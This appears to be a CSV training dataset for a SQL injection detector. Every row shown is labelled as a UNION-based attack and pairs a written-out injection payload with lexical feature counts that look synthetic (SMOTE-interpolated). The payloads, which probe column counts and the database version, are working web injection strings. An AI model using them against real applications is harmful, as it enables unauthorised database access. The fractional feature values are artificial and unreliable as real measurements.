id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000406,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000004,0.6759224309915846,76.0,26.0,3.8489418627440175,40.54247348612681,2.542473486126811,24.0,8.915053027746376,0.5334535985016686,0.03345359850166857,0.3157894736842105,0.11730332931245231,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000407,attack,union,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",nearest_attack_euclidean,R000051,0.24900050624636463,74.0,21.153061445337435,3.470740523228912,14.0,44.0,4.0,12.0,0.1891891891891892,0.5945945945945946,0.05405405405405406,0.16216216216216217,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000408,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,0.43809192231365934,59.43988660775901,22.0,3.9347038725199974,14.0,27.120226784481986,9.319659823277018,9.0,0.23557699013375213,0.45673146853770075,0.15624919052827788,0.15144235080026924,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.2199433038795031,0.0,0.0,4.780056696120496,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000409,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000015,0.21620796136813727,78.05856450998724,27.0,4.159370195973687,29.0,24.0,15.0,10.058564509987233,0.37151925173813216,0.30746420833500593,0.1921651302093787,0.12885140971748324,3.0,0.0,1.117129019974466,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,3.117129019974466,1.0,0.0,0.05856450998723295,0.941435490012767,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000410,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.3245470264745828,56.147207492629235,17.0,3.3087926384108153,37.70558501474153,1.0,8.441622477887709,9.0,0.6717730529881818,0.01781182035325457,0.15010874347927272,0.1603063831792909,0.9263962536853818,0.07360374631461819,0.0,0.0,0.0,0.0,0.0,1.0736037463146182,1.0,0.0,4.926396253685382,0.0,0.9263962536853818,0.07360374631461819,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.27166859452508035,77.48994540406622,31.204021838373514,4.199087674115288,42.0,3.897989080813245,21.48994540406622,10.102010919186757,0.5422237957550436,0.050242951648606954,0.2770349389932751,0.13049831360307423,0.0,0.0,2.0,0.0,1.0,1.897989080813244,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000412,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000048,0.05095864924428264,81.8023978846059,15.98764986778787,3.073177953833828,49.85179841345442,1.0,18.0,12.950599471151476,0.6093362113216866,0.012231633798114205,0.22016940836605575,0.15826274651414343,0.9876498677878687,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,7.962949603363606,0.0,0.9876498677878687,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000413,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000004,0.6824799848831953,76.0,26.0,3.8613292887211608,40.729206967852996,2.7292069678529955,23.729206967852996,8.812379096441012,0.5359106179980657,0.03591061799806575,0.3122264074717499,0.11595235653211856,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.541586064294007,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000414,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000071,0.09036936433760859,72.88295737762968,16.078028414913543,3.170037489169275,41.4538010956052,1.526691800666411,17.921971585086457,11.980492896271615,0.5681953118214542,0.021583631991621,0.2458414829102386,0.16437957327668606,0.0,1.0,2.019507103728386,0.0,0.0,0.0,0.0,2.980492896271614,0.0,0.0,5.980492896271614,2.019507103728386,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000415,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,0.7464017103924991,68.71360151032378,20.257279697935243,3.7531452914035204,14.0,37.941762416518046,5.029118791740976,11.742720302064756,0.20395814919900376,0.5510723755479807,0.0741063537100161,0.17086312154299946,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.2572796979352441,0.0,0.0,7.485440604129511,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.2572796979352441,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000416,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,0.0528399959626331,60.946943539941856,22.0,3.7963235196579186,14.0,24.10611292011629,13.840830619825569,9.0,0.22971458472931758,0.395594955034312,0.22701679862466623,0.14767366161170417,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.9734717699709283,0.0,0.0,4.026528230029072,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000417,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,0.8388206897567663,60.15774300108872,22.0,3.8687891622712063,14.0,25.68451399782257,11.473229003266145,9.0,0.23278455070429507,0.4276103144876487,0.18995792364100939,0.14964721116704685,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.5788715005443574,0.0,0.0,4.421128499455643,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000418,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,0.7567292171209535,79.0,26.150687277685506,3.8956267350512257,38.342439945459425,6.164432831395645,23.49312722314493,11.0,0.4853473410817649,0.07803079533412208,0.29738135725499915,0.13924050632911392,3.0,0.0,2.150687277685507,0.0,0.8493127223144931,1.0,0.0,1.849312722314493,0.0,0.0,1.1506872776855066,4.150687277685507,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.8493127223144931,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.849312722314493
SMOTE_000419,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.4063723580584597,64.14250129577526,16.0,3.1223944751184667,47.71400103662022,1.0,4.0,11.428500259155053,0.743663307496593,0.01564908125094641,0.06259632500378559,0.17809128624867504,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,7.428500259155053,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000420,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,2.439523376213224,72.03887836980256,24.46172371991225,3.8929651977727024,20.13487011487934,22.230861859956125,20.230861859956125,9.44228453501097,0.2741567842631619,0.30998707014540894,0.28177694045581325,0.13407920513561583,0.0,1.0,3.0,0.0,0.0,0.557715464989031,0.0,2.4422845350109688,0.0,0.0,2.442284535010969,3.5577154649890312,0.0,1.0,1.0,0.0,0.0,0.557715464989031,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.557715464989031,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5577154649890312
SMOTE_000421,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,1.0779590737003375,80.0,26.664007334156878,3.9922904730714572,22.996011001235317,28.007977997529366,19.328014668313756,9.667996332921561,0.28745013751544146,0.350099724969117,0.24160018335392197,0.12084995416151952,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.6660018335392197,0.0,0.0,3.0019944993823406,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000422,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,0.14236990961532778,62.85144805180975,20.85144805180975,3.8127581258419627,14.74275974095125,23.145826297906066,14.0,10.962862012952439,0.2353708880695701,0.3674340337704191,0.22278173991785405,0.17441333824215666,0.0,1.0,2.9628620129524377,0.0,0.0,0.0,0.0,2.0,1.0,0.0,4.0,2.9628620129524377,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000423,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000074,0.366457205546571,68.40315510314355,21.11936897937129,3.388658450808269,14.0,39.04504816502967,4.477475917485166,10.880631020628709,0.2047907220461935,0.5701952262819985,0.06597219608104675,0.15904185559076128,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.11936897937129165,0.0,0.0,7.7612620412574165,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.11936897937129165,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000424,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,1.022163999941906,62.29084075593933,22.0,3.8101332443674654,14.0,24.23267260475146,14.0,10.058168151187864,0.2287373500607996,0.38173741703168074,0.2287373500607996,0.16078788284672008,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,4.058168151187865,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000425,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,0.9091297605360065,63.73122060095281,21.355731616587267,3.758617242865988,14.0,26.57707353365094,11.865610300476405,11.28853676682547,0.2215763948494382,0.41774338851407167,0.18346229307223114,0.17721792356425897,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.6442683834127343,1.0,0.0,4.644268383412735,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,0.23136420274089456,67.92289162354548,20.92289162354549,3.67587938489699,14.0,27.69156649418195,14.30843350581805,11.922891623545487,0.20611929703036944,0.40763510889927546,0.21072278219183285,0.17552281187852226,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.0771083764545124,0.9228916235454876,0.0,4.922891623545488,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000427,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,1.7806071953660751,71.16248330810352,15.387494436034507,3.0920963299748783,46.90004451172395,1.0,11.874944360345069,11.387494436034507,0.6604459785548924,0.014058222444598145,0.16554720915055313,0.1599485898499563,0.0,0.38749443603450673,2.0,0.0,0.0,0.0,0.0,1.7749888720690135,0.0,0.0,7.225011127930987,2.0,0.0,0.38749443603450673,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000428,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.4662444637081158,76.0,26.0,3.8511953640349827,40.315597166645446,2.3155971666454462,24.0,9.368805666709108,0.5304683837716506,0.03046838377165062,0.3157894736842105,0.12327375877248824,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000429,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.49296074108119364,75.65919355655342,26.568010739077646,3.9089339580561098,40.454408591262116,2.0,23.204784965291296,10.0,0.5349977128107037,0.026438646879396732,0.30637040591291576,0.13219323439698374,0.0,0.0,2.0,0.0,1.1136021478155291,1.0,0.0,1.7727957043689417,0.0,0.0,0.9999999999999996,4.113602147815529,0.0,0.0,1.0,0.0,0.0,1.0,0.8863978521844708,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000430,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,0.4086351591176691,61.04217929570768,18.0,3.5282966292462863,14.0,32.926381596184605,4.0,10.115797699523077,0.22980905552176148,0.5387036614271572,0.06565973014907471,0.16582755290200668,0.0,0.8842023004769244,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.231595399046151,3.0,0.0,0.8842023004769244,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000431,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000071,1.5449032518267751,70.7397422086641,16.0,3.1579340251029935,42.0,1.0,16.493161472442726,11.246580736221363,0.5947517536773888,0.014160756039937827,0.23240348144190665,0.1586840088407668,0.0,1.0,1.2465807362213632,0.0,0.0,0.0,0.0,2.6232903681106814,0.0,0.0,6.0,1.2465807362213632,0.0,1.0,0.6232903681106816,0.3767096318893184,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,0.9518347358936744,64.34994678627977,21.484623571341572,3.753688608423978,14.0,28.123011429267414,12.45387071402472,9.77306464298764,0.2191184636668328,0.43134802266606065,0.19822482466716687,0.15130868899993977,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7423117856707868,0.0,0.0,5.030752857316853,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000433,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,0.05928938375166417,58.9257198253003,21.0,3.8648906227051705,14.0,27.80191953413412,8.14856034939941,8.975239941766764,0.2376028820961852,0.47166861301619395,0.13842593886566673,0.15230256602195416,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.024760058233235,0.0,0.0,4.95047988353353,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000434,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,1.076485356798178,74.85415652990847,22.26215362250763,3.8254675602237582,42.378463774923716,9.0,15.475692754984744,8.0,0.5647014628201572,0.12088434173092927,0.20696144724364307,0.10745274820527045,1.0,0.0,0.5243072450152564,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.737846377492372,1.5243072450152566,1.0,0.0,0.26215362250762836,0.7378463774923716,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000435,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,1.0749027774305047,76.30390318244214,23.73599308446015,3.800579727356401,23.22411064863755,28.871813280424135,14.0,10.20797925338046,0.3148020248910233,0.36719783103522985,0.1848002567132216,0.13319988736052524,0.0,1.0,2.735993084460153,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.471986168920306,3.735993084460153,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000436,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,0.9580714443328916,69.71510915039123,15.232194321899453,3.0780715376658976,40.786331862793425,1.0,18.0,9.928777287597809,0.5836518394732999,0.014465057437104328,0.26037103386787835,0.14151206922171733,0.2321943218994521,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.696582965698356,0.0,0.2321943218994521,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000437,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,0.4267151534766265,67.1175181928424,23.399113640300857,3.8640638823582707,34.201772719398285,10.19734092090257,14.63858182448137,8.079822728060172,0.5129173982444702,0.1494255373189371,0.2171403685068138,0.12051669592977882,0.9201772719398287,0.0798227280601713,2.0798227280601713,0.0,0.0,1.0,0.0,1.0798227280601713,0.0,0.0,2.9201772719398287,3.0798227280601713,0.9201772719398287,0.0798227280601713,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000438,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,0.034200709571267404,57.009345900050384,21.953270499748086,3.80455129556959,14.18691800100766,19.822427899042722,14.0,9.0,0.24879718192883588,0.34775906601464834,0.24557445777353135,0.15786929428298443,0.0,1.0,0.990654099949617,0.0,0.0,0.0,0.0,2.0,1.0,0.0,3.0093459000503833,0.990654099949617,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
